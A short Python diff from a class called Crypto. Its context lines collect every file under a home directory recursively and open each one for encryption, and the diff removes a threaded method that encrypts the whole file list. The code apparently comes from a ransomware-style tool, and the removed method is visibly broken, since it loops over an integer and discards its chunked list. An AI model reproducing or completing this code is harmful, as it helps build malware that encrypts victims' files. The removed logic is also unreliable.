@@ -30,20 +30,6 @@ class Crypto():
     def get_files(self):
         return glob.glob(self.home_directory + '\**', recursive=True)
 
-    def encrypt_file_list(self, file_list):
-        chunks = self.num_threads
-        [file_list[i * chunks:(i + 1) * chunks]
-         for i in range((len(file_list) + chunks - 1) // chunks)]
-        for chunk in chunks:
-            thread = Thread(target=lambda x: [
-                            self.encrypt_file(f) for f in chunk])
-            thread_list.append(thread)
-            thread.start()
-
-        for thread in self.thread_list:
-            thread.join()
-            thread_list.remove(thread)
-
     def encrypt_file(self, filename):
         encryptor = self.cipher.encryptor()
         plaintext = open(filename, 'rb').read()
